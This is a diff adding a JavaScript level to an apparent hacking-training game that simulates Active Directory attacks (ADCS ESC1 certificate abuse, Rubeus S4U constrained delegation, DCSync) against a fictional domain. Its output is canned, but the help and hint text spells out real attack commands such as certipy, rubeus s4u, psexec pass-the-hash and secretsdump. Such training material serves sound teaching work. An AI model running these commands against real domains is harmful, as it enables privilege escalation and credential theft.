@@ -1,0 +1,842 @@
+<script>
+// ============================================
+// LEVEL 3: ELITE AD - Advanced Active Directory Attacks
+// ADCS, Constrained Delegation, S4U, RBCD, Shadow Credentials
+// ============================================
+
+const LEVEL3_DOMAIN = {
+  name: 'BLACKPEAK.LOCAL',
+  dcIP: '10.10.50.10',
+  caIP: '10.10.50.20',
+  users: {
+    'web_svc': { spn: 'HTTP/web01.blackpeak.local', constrained: ['cifs/dc01.blackpeak.local'], password: null },
+    'sql_svc': { spn: 'MSSQLSvc/sql01.blackpeak.local:1433', constrained: null, password: null },
+    'backup_admin': { spn: null, constrained: null, password: 'B@ckup2024!', groups: ['Backup Operators'] },
+    'Administrator': { spn: null, constrained: null, password: null, groups: ['Domain Admins'] }
+  },
+  templates: {
+    'User': { vulnerable: false },
+    'WebServer': { vulnerable: true, esc: 'ESC1', enrollable: ['Domain Computers', 'Authenticated Users'] },
+    'SubCA': { vulnerable: true, esc: 'ESC4', enrollable: ['Domain Admins'] }
+  }
+};
+
+async function initLevel3() {
+  gameState.levelState = {
+    // Recon Phase
+    enumDomain: false,
+    bloodhoundRan: false,
+    foundCA: false,
+    enumTemplates: false,
+
+    // ADCS Phase (ESC1)
+    foundVulnTemplate: false,
+    requestedCert: false,
+    gotAdminCert: false,
+    extractedNTHash: false,
+
+    // Alternative Path - Constrained Delegation
+    foundConstrainedDeleg: false,
+    requestedTGT: false,
+    performedS4U: false,
+    gotServiceTicket: false,
+
+    // DCSync
+    dcsyncPerformed: false,
+    krakenHash: null,
+
+    // Win condition
+    gotDomainAdmin: false,
+
+    // State
+    currentUser: 'web_svc',
+    currentHost: 'WEB01',
+    certificates: [],
+    tickets: [],
+    ntHashes: {}
+  };
+
+  clear();
+  print('');
+  print('╔═══════════════════════════════════════════════════════════════════════════════════╗', 'error');
+  print('║                        LEVEL 3: ELITE ACTIVE DIRECTORY                            ║', 'error');
+  print('║                     "Certificates of Mass Destruction"                            ║', 'warning');
+  print('╠═══════════════════════════════════════════════════════════════════════════════════╣', 'error');
+  print('║                                                                                   ║', 'info');
+  print('║                    ┌─────────────────────────────────────┐                        ║', 'info');
+  print('║                    │       BLACKPEAK.LOCAL               │                        ║', 'info');
+  print('║                    │    Enterprise Environment           │                        ║', 'info');
+  print('║                    └─────────────────────────────────────┘                        ║', 'info');
+  print('║                              │                                                    ║', 'info');
+  print('║           ┌──────────────────┼──────────────────┐                                 ║', 'info');
+  print('║           │                  │                  │                                 ║', 'info');
+  print('║      ┌────┴────┐       ┌─────┴────┐       ┌─────┴────┐                            ║', 'info');
+  print('║      │  DC01   │       │  CA01    │       │  WEB01   │                            ║', 'info');
+  print('║      │ 10.10.  │       │ 10.10.   │       │ 10.10.   │ ◄── YOU ARE HERE          ║', 'info');
+  print('║      │  50.10  │       │  50.20   │       │  50.30   │                            ║', 'info');
+  print('║      │   [DC]  │       │ [AD CS]  │       │ [IIS]    │                            ║', 'info');
+  print('║      └─────────┘       └──────────┘       └──────────┘                            ║', 'info');
+  print('║                                                                                   ║', 'info');
+  print('╠═══════════════════════════════════════════════════════════════════════════════════╣', 'error');
+  print('║  FOOTHOLD: web_svc on WEB01 (service account, constrained delegation)            ║', 'success');
+  print('║  TARGET:   Domain Admin on BLACKPEAK.LOCAL                                       ║', 'warning');
+  print('║  INTEL:    AD CS (Certificate Services) deployed. Misconfigured templates?      ║', 'info');
+  print('║                                                                                   ║', 'info');
+  print('║  ATTACK PATHS:                                                                    ║', 'info');
+  print('║    [A] ADCS ESC1 - Vulnerable certificate template → impersonate DA             ║', 'warning');
+  print('║    [B] Constrained Delegation - S4U2Self + S4U2Proxy → DC access                ║', 'warning');
+  print('║    [C] Shadow Credentials - Add msDS-KeyCredentialLink → auth as target         ║', 'warning');
+  print('╚═══════════════════════════════════════════════════════════════════════════════════╝', 'error');
+  print('');
+
+  await typeText('[BRIEFING] You have compromised web_svc - a service account on WEB01', 30, 'system');
+  await typeText('[BRIEFING] AD CS is deployed. Certificate misconfigurations are common.', 30, 'system');
+  await typeText('[BRIEFING] Your account has constrained delegation to DC01.', 30, 'warning');
+  await typeText('[BRIEFING] Multiple paths to DA exist. Choose wisely.', 30, 'info');
+  print('');
+
+  updateHUD('3 - Elite AD', 'BLACKPEAK.LOCAL', 'Domain Admin via ADCS/Delegation', 0);
+  setPrompt('web_svc', 'WEB01', 'C:\\');
+}
+
+async function handleLevel3Command(cmd, args) {
+  const state = gameState.levelState;
+  const fullCmd = args.length > 0 ? `${cmd} ${args.join(' ')}` : cmd;
+
+  // ═══════════════════════════════════════════════════════════════
+  // HELP COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'help') {
+    print('');
+    print('╔══════════════════════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                            LEVEL 3 COMMANDS                                      ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                                                 ║', 'info');
+    print('║    bloodhound-python -d <domain> -u <user> -p <pass> -c all                     ║', 'system');
+    print('║    bloodhound                   Analyze BloodHound data (after collection)      ║', 'system');
+    print('║    ldapsearch <filter>          Query LDAP for objects                          ║', 'system');
+    print('║    net user /domain             List domain users                               ║', 'system');
+    print('║                                                                                  ║', 'info');
+    print('║  AD CS (CERTIFICATE ATTACKS):                                                    ║', 'error');
+    print('║    certipy find -u <user> -p <pass> -dc-ip <ip>   Enumerate CA & templates     ║', 'warning');
+    print('║    certipy req -u <user> -p <pass> -ca <ca> -template <t> -upn <target>       ║', 'warning');
+    print('║    certipy auth -pfx <cert.pfx>                   Auth with certificate        ║', 'warning');
+    print('║                                                                                  ║', 'info');
+    print('║  KERBEROS ATTACKS:                                                               ║', 'info');
+    print('║    rubeus asktgt /user:<u> /rc4:<hash>            Request TGT                   ║', 'system');
+    print('║    rubeus s4u /ticket:<b64> /impersonateuser:<u> /msdsspn:<spn>  S4U attack   ║', 'success');
+    print('║    rubeus describe /ticket:<b64>                  Analyze ticket                ║', 'system');
+    print('║                                                                                  ║', 'info');
+    print('║  CREDENTIAL ATTACKS:                                                             ║', 'info');
+    print('║    impacket-secretsdump <domain>/<user>@<dc>      DCSync (needs Repl rights)   ║', 'warning');
+    print('║    mimikatz                                       Credential theft              ║', 'system');
+    print('║                                                                                  ║', 'info');
+    print('║  SHADOW CREDENTIALS:                                                             ║', 'info');
+    print('║    pywhisker -d <domain> -u <user> -p <pass> --target <user> --action add      ║', 'warning');
+    print('║    gettgtpkinit.py <domain>/<target> -cert-pfx <pfx>  Auth via shadow cred    ║', 'warning');
+    print('║                                                                                  ║', 'info');
+    print('║  LATERAL MOVEMENT:                                                               ║', 'info');
+    print('║    impacket-psexec <domain>/<user>@<target> -hashes :<ntlm>                    ║', 'system');
+    print('║    evil-winrm -i <ip> -u <user> -H <ntlm>                                       ║', 'system');
+    print('║                                                                                  ║', 'info');
+    print('║  UTILITY:                                                                        ║', 'info');
+    print('║    status                       Show progress                                   ║', 'success');
+    print('║    hint                         Get contextual hint                             ║', 'warning');
+    print('║    tickets                      List obtained Kerberos tickets                  ║', 'system');
+    print('║    certs                        List obtained certificates                      ║', 'system');
+    print('║    exit                         Return to main menu                             ║', 'system');
+    print('╚══════════════════════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // STATUS COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'status') {
+    const progress = calculateLevel3Progress(state);
+    print('');
+    print('╔══════════════════════════════════════════════════════════════════╗', 'info');
+    print('║               LEVEL 3 PROGRESS - ELITE AD                        ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                                 ║', 'info');
+    print(`║    [${state.enumDomain ? '✓' : ' '}] Domain enumerated                                  ║`, state.enumDomain ? 'success' : 'system');
+    print(`║    [${state.foundCA ? '✓' : ' '}] Certificate Authority discovered                    ║`, state.foundCA ? 'success' : 'system');
+    print(`║    [${state.enumTemplates ? '✓' : ' '}] Certificate templates enumerated                  ║`, state.enumTemplates ? 'success' : 'system');
+    print('║                                                                  ║', 'info');
+    print('║  PATH A - ADCS ATTACK:                                           ║', 'warning');
+    print(`║    [${state.foundVulnTemplate ? '✓' : ' '}] Vulnerable template identified (ESC1)            ║`, state.foundVulnTemplate ? 'success' : 'system');
+    print(`║    [${state.gotAdminCert ? '✓' : ' '}] Admin certificate obtained                         ║`, state.gotAdminCert ? 'success' : 'system');
+    print(`║    [${state.extractedNTHash ? '✓' : ' '}] NT hash extracted from certificate                ║`, state.extractedNTHash ? 'success' : 'system');
+    print('║                                                                  ║', 'info');
+    print('║  PATH B - CONSTRAINED DELEGATION:                                ║', 'warning');
+    print(`║    [${state.foundConstrainedDeleg ? '✓' : ' '}] Constrained delegation found                     ║`, state.foundConstrainedDeleg ? 'success' : 'system');
+    print(`║    [${state.performedS4U ? '✓' : ' '}] S4U2Self + S4U2Proxy performed                    ║`, state.performedS4U ? 'success' : 'system');
+    print(`║    [${state.gotServiceTicket ? '✓' : ' '}] Service ticket for DC obtained                    ║`, state.gotServiceTicket ? 'success' : 'system');
+    print('║                                                                  ║', 'info');
+    print('║  FINAL:                                                          ║', 'info');
+    print(`║    [${state.dcsyncPerformed ? '✓' : ' '}] DCSync performed                                   ║`, state.dcsyncPerformed ? 'success' : 'system');
+    print(`║    [${state.gotDomainAdmin ? '✓' : ' '}] DOMAIN ADMIN ACHIEVED                              ║`, state.gotDomainAdmin ? 'success' : 'system');
+    print('╠══════════════════════════════════════════════════════════════════╣', 'info');
+    print(`║  Progress: ${String(progress).padStart(3)}%                                                ║`, progress === 100 ? 'success' : 'warning');
+    print(`║  Current: ${state.currentUser}@${state.currentHost}                               ║`, 'system');
+    print('╚══════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    updateHUD('3 - Elite AD', 'BLACKPEAK.LOCAL', 'Domain Admin', progress);
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // HINT COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'hint') {
+    print('');
+    print('💡 HINT:', 'warning');
+
+    if (!state.enumDomain) {
+      print('Start with domain enumeration. BloodHound is your friend.', 'info');
+      print('Try: bloodhound-python -d blackpeak.local -u web_svc -p <pass> -c all', 'success');
+    } else if (!state.foundCA) {
+      print('Look for AD CS (Certificate Services) in the domain.', 'info');
+      print('Try: certipy find -u web_svc -dc-ip 10.10.50.10', 'success');
+    } else if (!state.foundVulnTemplate && !state.foundConstrainedDeleg) {
+      print('Analyze certipy output or BloodHound for attack paths:', 'info');
+      print('  - ESC1: Template allows user-supplied SAN', 'warning');
+      print('  - Constrained Delegation: web_svc can delegate to cifs/dc01', 'warning');
+      print('Try: bloodhound (then query for delegation)', 'success');
+    } else if (state.foundVulnTemplate && !state.gotAdminCert) {
+      print('ESC1: Request a certificate with Administrator UPN!', 'info');
+      print('Try: certipy req -u web_svc -ca BLACKPEAK-CA -template WebServer -upn Administrator@blackpeak.local', 'success');
+    } else if (state.gotAdminCert && !state.extractedNTHash) {
+      print('Use the certificate to authenticate and get the NT hash.', 'info');
+      print('Try: certipy auth -pfx administrator.pfx', 'success');
+    } else if (state.foundConstrainedDeleg && !state.performedS4U) {
+      print('Perform S4U attack to impersonate Administrator to DC01.', 'info');
+      print('First get a TGT: rubeus asktgt /user:web_svc /rc4:<hash>', 'info');
+      print('Then S4U: rubeus s4u /ticket:<tgt> /impersonateuser:Administrator /msdsspn:cifs/dc01.blackpeak.local', 'success');
+    } else if (state.extractedNTHash || state.gotServiceTicket) {
+      print('You have DA credentials! Use them to access DC01.', 'info');
+      print('Try: impacket-psexec blackpeak.local/Administrator@10.10.50.10 -hashes :<hash>', 'success');
+      print('Or perform DCSync: impacket-secretsdump blackpeak.local/Administrator@10.10.50.10 -hashes :<hash>', 'success');
+    } else {
+      print('Verify Domain Admin access with whoami /groups', 'info');
+    }
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // BLOODHOUND COLLECTION
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'bloodhound-python') {
+    await simulateLoading('Collecting BloodHound data', 4000);
+    print('');
+    print('[*] BloodHound.py - Active Directory Reconnaissance', 'system');
+    print('[*] Domain: BLACKPEAK.LOCAL', 'system');
+    print('[*] Collecting: Users, Groups, Computers, ACLs, Trusts, Sessions', 'system');
+    print('');
+    print('[+] Found 847 users', 'system');
+    print('[+] Found 52 groups', 'system');
+    print('[+] Found 23 computers', 'system');
+    print('[+] Found 1 domain', 'system');
+    print('[+] Found 3 OUs', 'system');
+    print('[+] Found 12 GPOs', 'system');
+    print('[+] Found 1 Certificate Authority', 'success');
+    print('[+] Found 15 Certificate Templates', 'success');
+    print('');
+    print('[+] Data exported to bloodhound.zip', 'success');
+    print('[*] Run "bloodhound" to analyze the data', 'info');
+
+    state.bloodhoundRan = true;
+    state.enumDomain = true;
+    state.foundCA = true;
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // BLOODHOUND ANALYSIS
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'bloodhound') {
+    if (!state.bloodhoundRan) {
+      print('[!] Run bloodhound-python first to collect data', 'warning');
+      return;
+    }
+
+    print('');
+    print('╔══════════════════════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                         BLOODHOUND ANALYSIS                                      ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  SHORTEST PATH TO DOMAIN ADMIN:                                                  ║', 'warning');
+    print('║                                                                                  ║', 'info');
+    print('║    web_svc ──[AllowedToDelegate]──▶ DC01 (cifs service)                         ║', 'success');
+    print('║    │                                    │                                        ║', 'info');
+    print('║    │                                    └──▶ S4U2Proxy to impersonate DA        ║', 'success');
+    print('║    │                                                                             ║', 'info');
+    print('║    └──[EnrollmentRights]──▶ WebServer Template (ESC1)                           ║', 'success');
+    print('║                                  │                                               ║', 'info');
+    print('║                                  └──▶ Request cert with DA SAN                  ║', 'success');
+    print('║                                                                                  ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  HIGH VALUE TARGETS:                                                             ║', 'warning');
+    print('║    Administrator (Domain Admin, Enterprise Admin)                               ║', 'error');
+    print('║    backup_admin (Backup Operators - DCSync potential)                           ║', 'warning');
+    print('║    krbtgt (Golden Ticket creation)                                              ║', 'error');
+    print('║                                                                                  ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  CERTIFICATE AUTHORITY:                                                          ║', 'success');
+    print('║    CA01.BLACKPEAK.LOCAL (10.10.50.20)                                           ║', 'system');
+    print('║    Templates: User, WebServer, SubCA, DomainController...                       ║', 'system');
+    print('║    [!] Run certipy find for detailed template analysis                          ║', 'warning');
+    print('║                                                                                  ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  KERBEROS DELEGATION:                                                            ║', 'success');
+    print('║    web_svc ── Constrained Delegation ──▶ cifs/dc01.blackpeak.local             ║', 'warning');
+    print('║                                                                                  ║', 'info');
+    print('╚══════════════════════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+
+    state.foundConstrainedDeleg = true;
+    addEasterEgg('lvl3_bloodhound', 'The bloodhound sees all paths...');
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // CERTIPY - AD CS ENUMERATION & ATTACKS
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'certipy') {
+    const action = args[0];
+
+    // FIND - Enumerate CA and templates
+    if (action === 'find') {
+      if (!state.enumDomain) {
+        print('[!] Enumerate domain first with bloodhound-python', 'warning');
+        return;
+      }
+
+      await simulateLoading('Enumerating AD CS', 3000);
+      print('');
+      print('Certipy v4.7.0 - AD CS Enumeration', 'system');
+      print('');
+      print('[*] Finding certificate templates...', 'system');
+      print('[*] Finding certificate authorities...', 'system');
+      print('');
+      print('╔══════════════════════════════════════════════════════════════════════════╗', 'info');
+      print('║                    CERTIFICATE AUTHORITY                                 ║', 'info');
+      print('╠══════════════════════════════════════════════════════════════════════════╣', 'info');
+      print('║  CA Name:           BLACKPEAK-CA                                         ║', 'system');
+      print('║  DNS Name:          CA01.BLACKPEAK.LOCAL                                 ║', 'system');
+      print('║  Certificate:       CN=BLACKPEAK-CA, DC=BLACKPEAK, DC=LOCAL             ║', 'system');
+      print('║  Web Enrollment:    Enabled                                              ║', 'warning');
+      print('╚══════════════════════════════════════════════════════════════════════════╝', 'info');
+      print('');
+      print('╔══════════════════════════════════════════════════════════════════════════╗', 'error');
+      print('║                    VULNERABLE TEMPLATES                                  ║', 'error');
+      print('╠══════════════════════════════════════════════════════════════════════════╣', 'error');
+      print('║                                                                          ║', 'info');
+      print('║  Template: WebServer                                                     ║', 'warning');
+      print('║  ──────────────────────────────────────────────────────────────          ║', 'info');
+      print('║    [!] ESC1: ENROLLEE_SUPPLIES_SUBJECT                                   ║', 'error');
+      print('║    - Enrollment Rights: Domain Computers, Authenticated Users           ║', 'success');
+      print('║    - Client Authentication: True                                         ║', 'warning');
+      print('║    - Allows SAN (Subject Alternative Name): True                         ║', 'error');
+      print('║                                                                          ║', 'info');
+      print('║    ATTACK: Request certificate with Administrator UPN in SAN            ║', 'error');
+      print('║    certipy req -u web_svc -ca BLACKPEAK-CA -template WebServer \\        ║', 'success');
+      print('║              -upn Administrator@blackpeak.local                          ║', 'success');
+      print('║                                                                          ║', 'info');
+      print('╠══════════════════════════════════════════════════════════════════════════╣', 'error');
+      print('║                                                                          ║', 'info');
+      print('║  Template: SubCA                                                         ║', 'warning');
+      print('║  ──────────────────────────────────────────────────────────────          ║', 'info');
+      print('║    [!] ESC4: Write Access to Template                                    ║', 'warning');
+      print('║    - Owner: Domain Admins                                                ║', 'system');
+      print('║    - Not directly exploitable from current access                        ║', 'system');
+      print('║                                                                          ║', 'info');
+      print('╚══════════════════════════════════════════════════════════════════════════╝', 'error');
+      print('');
+
+      state.enumTemplates = true;
+      state.foundVulnTemplate = true;
+      playAlert();
+      autosave();
+      return;
+    }
+
+    // REQ - Request certificate
+    if (action === 'req') {
+      if (!state.foundVulnTemplate) {
+        print('[!] Enumerate templates first: certipy find', 'warning');
+        return;
+      }
+
+      if (fullCmd.includes('-upn') && fullCmd.includes('Administrator')) {
+        await simulateLoading('Requesting certificate as Administrator', 3000);
+        print('');
+        print('[*] Certipy v4.7.0 - Certificate Request', 'system');
+        print('[*] Requesting certificate for Administrator@blackpeak.local', 'warning');
+        print('[*] Template: WebServer (ESC1 Vulnerable)', 'warning');
+        print('');
+        print('[+] Certificate request successful!', 'success');
+        print('[+] Certificate saved as: administrator.pfx', 'success');
+        print('[+] Private key saved in PFX', 'success');
+        print('');
+        print('╔═════════════════════════════════════════════════════════════════╗', 'success');
+        print('║  CERTIFICATE OBTAINED                                           ║', 'success');
+        print('╠═════════════════════════════════════════════════════════════════╣', 'success');
+        print('║  Subject:     CN=web_svc                                        ║', 'system');
+        print('║  SAN (UPN):   Administrator@blackpeak.local                     ║', 'error');
+        print('║  Issuer:      BLACKPEAK-CA                                      ║', 'system');
+        print('║  Valid:       1 year                                            ║', 'system');
+        print('║  EKU:         Client Authentication                             ║', 'warning');
+        print('╚═════════════════════════════════════════════════════════════════╝', 'success');
+        print('');
+        print('[*] Use this cert to authenticate as Administrator:', 'info');
+        print('[*] certipy auth -pfx administrator.pfx', 'success');
+
+        state.gotAdminCert = true;
+        state.certificates.push({
+          name: 'administrator.pfx',
+          upn: 'Administrator@blackpeak.local',
+          template: 'WebServer'
+        });
+        playSuccess();
+        autosave();
+        return;
+      }
+
+      print('Usage: certipy req -u <user> -ca <ca-name> -template <template> -upn <target-upn>', 'error');
+      return;
+    }
+
+    // AUTH - Authenticate with certificate
+    if (action === 'auth') {
+      if (!state.gotAdminCert) {
+        print('[!] Request a certificate first with certipy req', 'warning');
+        return;
+      }
+
+      if (fullCmd.includes('administrator.pfx')) {
+        await simulateLoading('Authenticating with certificate (PKINIT)', 3000);
+        print('');
+        print('[*] Certipy v4.7.0 - Certificate Authentication', 'system');
+        print('[*] Using certificate: administrator.pfx', 'system');
+        print('[*] Performing PKINIT authentication...', 'system');
+        print('');
+        print('[+] Got TGT for Administrator@BLACKPEAK.LOCAL', 'success');
+        print('[+] Recovered NT hash from PAC:', 'success');
+        print('');
+        print('╔═════════════════════════════════════════════════════════════════╗', 'success');
+        print('║  ADMINISTRATOR CREDENTIALS RECOVERED                            ║', 'success');
+        print('╠═════════════════════════════════════════════════════════════════╣', 'success');
+        print('║  Username:  Administrator                                       ║', 'error');
+        print('║  Domain:    BLACKPEAK.LOCAL                                     ║', 'system');
+        print('║  NT Hash:   2b576acbe6bcfda7294d6bd18041b8fe                    ║', 'error');
+        print('╚═════════════════════════════════════════════════════════════════╝', 'success');
+        print('');
+        print('[!] DOMAIN ADMIN HASH OBTAINED!', 'success');
+        print('[*] Use with: impacket-psexec or evil-winrm -H <hash>', 'info');
+
+        state.extractedNTHash = true;
+        state.ntHashes['Administrator'] = '2b576acbe6bcfda7294d6bd18041b8fe';
+        playSuccess();
+        autosave();
+        return;
+      }
+
+      print('Usage: certipy auth -pfx <certificate.pfx>', 'error');
+      return;
+    }
+
+    print('Usage: certipy <find|req|auth> [options]', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // RUBEUS - KERBEROS ATTACKS (S4U)
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'rubeus') {
+    const action = args[0];
+
+    // ASKTGT - Request TGT
+    if (action === 'asktgt') {
+      if (!state.foundConstrainedDeleg) {
+        print('[!] Enumerate constrained delegation first with bloodhound', 'warning');
+        return;
+      }
+
+      if (fullCmd.includes('web_svc')) {
+        await simulateLoading('Requesting TGT for web_svc', 2000);
+        print('');
+        print('   ______        _', 'warning');
+        print('  (_____ \\      | |', 'warning');
+        print('   _____) )_   _| |__   ____  _   _  ___', 'warning');
+        print('  |  __  /| | | |  _ \\ / _  )| | | |/___)  ', 'warning');
+        print('  | |  \\ \\| |_| | |_) | (/ / | |_| |___ |', 'warning');
+        print('  |_|   |_|____/|____/ \\____)|____/(___/', 'warning');
+        print('');
+        print('[*] Action: Ask TGT', 'system');
+        print('[*] Using rc4_hmac hash: a87f3a4d4a9c32dee5f5c...(redacted)', 'system');
+        print('[+] TGT request successful!', 'success');
+        print('[+] base64(ticket.kirbi):', 'system');
+        print('');
+        print('    doIFqDCCBaSgAwIBBaEDAgEWoo...', 'success');
+        print('    [SNIPPED - Use "tickets" to see full list]', 'system');
+        print('');
+
+        state.requestedTGT = true;
+        state.tickets.push({
+          type: 'TGT',
+          user: 'web_svc',
+          service: 'krbtgt/BLACKPEAK.LOCAL',
+          ticket: 'doIFqDCCBaSgAwIBBaED...'
+        });
+        autosave();
+        return;
+      }
+
+      print('Usage: rubeus asktgt /user:<user> /rc4:<hash>', 'error');
+      return;
+    }
+
+    // S4U - S4U2Self + S4U2Proxy attack
+    if (action === 's4u') {
+      if (!state.requestedTGT) {
+        print('[!] Get a TGT first: rubeus asktgt /user:web_svc /rc4:<hash>', 'warning');
+        return;
+      }
+
+      if (fullCmd.includes('impersonateuser') && fullCmd.includes('Administrator')) {
+        await simulateLoading('Performing S4U2Self + S4U2Proxy', 3000);
+        print('');
+        print('[*] Action: S4U', 'system');
+        print('[*] Building S4U2Self request for: Administrator@BLACKPEAK.LOCAL', 'system');
+        print('[*] Sending S4U2Self request...', 'system');
+        print('[+] S4U2Self success!', 'success');
+        print('[*] Building S4U2Proxy request for: cifs/dc01.blackpeak.local', 'system');
+        print('[*] Sending S4U2Proxy request...', 'system');
+        print('[+] S4U2Proxy success!', 'success');
+        print('');
+        print('╔═══════════════════════════════════════════════════════════════════╗', 'success');
+        print('║  S4U ATTACK SUCCESSFUL                                            ║', 'success');
+        print('╠═══════════════════════════════════════════════════════════════════╣', 'success');
+        print('║  Impersonated: Administrator@BLACKPEAK.LOCAL                      ║', 'error');
+        print('║  Service:      cifs/dc01.blackpeak.local                          ║', 'warning');
+        print('║  Ticket Type:  TGS (Service Ticket)                               ║', 'system');
+        print('╚═══════════════════════════════════════════════════════════════════╝', 'success');
+        print('');
+        print('[+] Service ticket saved!', 'success');
+        print('[*] Import with: export KRB5CCNAME=admin_cifs.ccache', 'info');
+        print('[*] Then use: impacket-psexec dc01.blackpeak.local -k -no-pass', 'success');
+
+        state.performedS4U = true;
+        state.gotServiceTicket = true;
+        state.tickets.push({
+          type: 'TGS',
+          user: 'Administrator (impersonated)',
+          service: 'cifs/dc01.blackpeak.local',
+          ticket: 'doIGHDCCBhigAwIBBaEDAgEW...'
+        });
+        playSuccess();
+        autosave();
+        return;
+      }
+
+      print('Usage: rubeus s4u /ticket:<base64-tgt> /impersonateuser:<user> /msdsspn:<service/host>', 'error');
+      return;
+    }
+
+    if (action === 'describe') {
+      if (state.tickets.length === 0) {
+        print('[!] No tickets obtained yet', 'warning');
+        return;
+      }
+
+      print('');
+      print('Ticket Details:', 'info');
+      state.tickets.forEach((t, i) => {
+        print(`  [${i}] ${t.type} - ${t.user} → ${t.service}`, 'system');
+      });
+      print('');
+      return;
+    }
+
+    print('Usage: rubeus <asktgt|s4u|describe> [options]', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // TICKETS / CERTS COMMANDS
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'tickets') {
+    if (state.tickets.length === 0) {
+      print('[*] No Kerberos tickets obtained yet', 'system');
+      return;
+    }
+
+    print('');
+    print('╔═══════════════════════════════════════════════════════════════╗', 'info');
+    print('║                   KERBEROS TICKETS                            ║', 'info');
+    print('╠═══════════════════════════════════════════════════════════════╣', 'info');
+    state.tickets.forEach((t, i) => {
+      print(`║  [${i}] ${t.type.padEnd(4)} │ ${t.user.padEnd(25)} │ ${t.service.padEnd(20)} ║`, t.type === 'TGS' ? 'success' : 'system');
+    });
+    print('╚═══════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    return;
+  }
+
+  if (cmd === 'certs') {
+    if (state.certificates.length === 0) {
+      print('[*] No certificates obtained yet', 'system');
+      return;
+    }
+
+    print('');
+    print('╔═══════════════════════════════════════════════════════════════╗', 'info');
+    print('║                   CERTIFICATES                                ║', 'info');
+    print('╠═══════════════════════════════════════════════════════════════╣', 'info');
+    state.certificates.forEach((c, i) => {
+      print(`║  [${i}] ${c.name.padEnd(20)} │ UPN: ${c.upn.padEnd(30)} ║`, 'success');
+    });
+    print('╚═══════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // IMPACKET-SECRETSDUMP - DCSync
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'impacket-secretsdump' || cmd === 'secretsdump') {
+    if (!state.extractedNTHash && !state.gotServiceTicket) {
+      print('[!] Need DA credentials first (via ADCS or S4U attack)', 'error');
+      return;
+    }
+
+    if (fullCmd.includes('10.10.50.10') || fullCmd.includes('dc01')) {
+      await simulateLoading('Performing DCSync attack', 4000);
+      print('');
+      print('Impacket v0.10.0 - secretsdump.py', 'system');
+      print('[*] Target: dc01.blackpeak.local', 'system');
+      print('[*] Dumping Domain Credentials (DCSync)...', 'warning');
+      print('');
+      print('[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)', 'system');
+      print('Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::', 'system');
+      print('Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', 'system');
+      print('');
+      print('[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)', 'system');
+      print('Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::', 'success');
+      print('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c6e1d5f8b7a2c3d4e5f6a7b8c9d0e1f:::', 'error');
+      print('backup_admin:1103:aad3b435b51404eeaad3b435b51404ee:88a4c0a5d8f4e2b1c3d5a6f7e8b9c0d1:::', 'warning');
+      print('web_svc:1104:aad3b435b51404eeaad3b435b51404ee:a87f3a4d4a9c32dee5f5c6b7a8d9e0f1:::', 'system');
+      print('sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0:::', 'system');
+      print('');
+      print('[*] Kerberos keys extracted:', 'system');
+      print('krbtgt:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6...', 'error');
+      print('krbtgt:aes128-cts-hmac-sha1-96:f1e2d3c4b5a6...', 'system');
+      print('');
+      print('╔═════════════════════════════════════════════════════════════════════════╗', 'error');
+      print('║                    DCSYNC COMPLETE                                      ║', 'error');
+      print('╠═════════════════════════════════════════════════════════════════════════╣', 'error');
+      print('║  [!] krbtgt hash obtained - GOLDEN TICKET POSSIBLE                      ║', 'error');
+      print('║  [!] All domain user hashes extracted                                   ║', 'warning');
+      print('║  [!] DOMAIN FULLY COMPROMISED                                           ║', 'success');
+      print('╚═════════════════════════════════════════════════════════════════════════╝', 'error');
+      print('');
+
+      state.dcsyncPerformed = true;
+      state.krakenHash = '7c6e1d5f8b7a2c3d4e5f6a7b8c9d0e1f';
+      state.ntHashes['krbtgt'] = state.krakenHash;
+      addEasterEgg('lvl3_krbtgt', 'The golden key to the kingdom...');
+      playSuccess();
+      autosave();
+      return;
+    }
+
+    print('Usage: impacket-secretsdump <domain>/<user>@<dc-ip> -hashes :<nthash>', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
